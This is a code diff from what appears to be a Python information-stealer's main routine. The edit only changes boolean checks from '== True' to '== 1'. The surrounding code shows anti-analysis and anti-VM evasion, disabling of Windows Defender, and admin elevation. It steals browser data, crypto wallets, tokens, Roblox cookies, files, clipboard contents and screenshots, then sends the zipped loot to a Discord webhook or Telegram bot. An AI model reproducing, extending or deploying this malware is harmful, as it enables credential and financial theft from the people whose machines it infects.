@@ -38,21 +38,21 @@ from vic_config import config
       
 def main() -> None:
     
-    if config.get("checkAnalysis") == True:
+    if config.get("checkAnalysis") == 1:
             Anti_Analysis() # anti analysis
-    if config.get("antiVM") == True:
+    if config.get("antiVM") == 1:
         AntiVm() # anti vm
-    if config.get("antiCIS") == True:
+    if config.get("antiCIS") == 1:
         anti_cis(config.get("BLACKLIST")) # anti cis
         
     if config.get("executionDelay") != "":
         time.sleep(float(config["executionDelay"]))
         
-    if config.get("UACAdmin") == True:
+    if config.get("UACAdmin") == 1:
         run_as_admin() # run as admin
         
         
-    if config.get("defenderDisable") == True:
+    if config.get("defenderDisable") == 1:
         deseble_defander()
         
     if config.get("errorMessage") != "":
@@ -66,42 +66,42 @@ def main() -> None:
         return None
         
     async def _run_all_functions() -> None:
-        if config.get("extractBrowsersData") == True:
+        if config.get("extractBrowsersData") == 1:
             Walkthrough(result_log_dir)
             
-        if config.get("extractWallets") == True:
+        if config.get("extractWallets") == 1:
             Wallets(result_log_dir)
             
-        if config.get("extractFiles") == True:
+        if config.get("extractFiles") == 1:
             steal_desktop_txt_file(result_log_dir)
             
-        if config.get("extractGameData") == True:
+        if config.get("extractGameData") == 1:
             gamesSteal(result_log_dir)
             extract_roblox_cookies(result_log_dir)
             
         installed_software.get_installed_programs(result_log_dir)
-        if config.get("extractSystemInfo") == True:
+        if config.get("extractSystemInfo") == 1:
             getOS(result_log_dir)
             
-        if config.get("extractBrowsersVersion") == True:
+        if config.get("extractBrowsersVersion") == 1:
             all_browsers_version(result_log_dir)
             
-        if config.get("extractTokens") == True:
+        if config.get("extractTokens") == 1:
             StealAllTokens(result_log_dir)
             
-        if config.get("networkSteal") == True:
+        if config.get("networkSteal") == 1:
             network_data(result_log_dir)
             
-        if config.get("clipboardSteal") == True:
+        if config.get("clipboardSteal") == 1:
             clipboard_data(result_log_dir)
             
-        if config.get("extractProcess") == True: 
+        if config.get("extractProcess") == 1: 
             steal_process(result_log_dir)
             
-        if config.get("screanShot") == True:
+        if config.get("screanShot") == 1:
             screan_shot(result_log_dir)
             
-        if config.get("appCollectorEnabled") == True:
+        if config.get("appCollectorEnabled") == 1:
             StealAll(result_log_dir, config)
                   
     asyncio.run(_run_all_functions())
@@ -112,14 +112,14 @@ def main() -> None:
     if not os.path.exists(zip_file_path): # check result.zip is exists are not return and exit function
         return None # breack funtion
     
-    if config.get("sendToDiscord") == True and config.get("discordWebhookUrl") != "":
+    if config.get("sendToDiscord") == 1 and config.get("discordWebhookUrl") != "":
         send_to_discord(
             config["discordWebhookUrl"],
             zip_file_path,
             descord_log()
         ) # send data to discord
         
-    if config.get("sendToTelegram") == True and config.get("telegramBotToken") != "" and config.get("telegramChatId") != "":
+    if config.get("sendToTelegram") == 1 and config.get("telegramBotToken") != "" and config.get("telegramChatId") != "":
         send_data(
             config["telegramBotToken"],
             config["telegramChatId"],
